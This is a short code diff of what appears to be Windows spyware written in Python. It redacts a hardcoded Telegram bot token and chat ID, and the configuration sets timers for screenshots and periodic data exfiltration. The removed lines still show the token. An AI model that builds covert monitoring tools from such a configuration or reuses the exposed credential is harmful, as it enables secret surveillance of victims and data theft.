@@ -15,8 +15,8 @@ import getpass
 import winreg
 
 # ===== CONFIGURATION =====
-BOT_TOKEN = "7797552393:AAGAUJRpYTbAS5diVpmhvxJ2KMJskWWpECE"
-CHAT_ID = "6318821105"
+BOT_TOKEN = "..........................................."
+CHAT_ID = "................."
 SCREENSHOT_INTERVAL = 1800  # 30 minutes in seconds
 EXFIL_INTERVAL = 1200       # 20 minutes in seconds
 # =========================
